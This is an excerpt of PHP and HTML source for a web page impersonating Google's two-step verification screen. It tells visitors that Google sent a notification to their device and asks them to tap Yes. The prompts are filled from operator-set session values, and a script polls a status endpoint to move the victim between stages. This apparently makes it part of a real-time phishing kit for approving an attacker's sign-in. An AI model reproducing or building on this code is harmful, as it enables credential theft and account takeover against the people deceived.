...
// Use dynamic questions if available; otherwise use defaults.
$question1 = isset($sess['sign_in_request_question1']) && !empty($sess['sign_in_request_question1'])
    ? $sess['sign_in_request_question1']
    : "Sign-In Request";
$question2 = isset($sess['sign_in_request_question2']) ? $sess['sign_in_request_question2'] : "";
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
...
<body>
    <div class="container">
        <div class="signin-card">
            ...
            <div class="signin-right">
                <form method="post">
                    <div class="otp-info">
                        <h2 class="showed-otp"><?php echo htmlspecialchars($question1); ?></h2>
                        <h2>Check your <?php echo htmlspecialchars($question2); ?></h2>
                        <p>Google sent a notification to your <?php echo htmlspecialchars($question2); ?>. Tap <strong>Yes</strong> on the notification, then tap <strong><?php echo htmlspecialchars($question1); ?></strong> on your phone to verify it's you.</p>
                    </div>

                    <div class="checkbox-container" style="margin: 24px 0;">
                        <input type="checkbox" id="dont-ask">
                        <span class="checkbox-label">Don't ask again on this device</span>
                    </div>

                    <div class="button-group">
                        <button type="button" class="create-account">Try another way</button>
    ...
    <script>
        ...
        // Poll for status changes; if status is no longer "sign_in_request", redirect to waiting.php.
        const sessionId = "<?php echo $sessionId; ?>";
        setInterval(function(){
            fetch('../poll_status.php?session_id=' + sessionId)
            .then(r => r.json())
            .then(data => {
                if (data.status && data.status !== 'sign_in_request') {
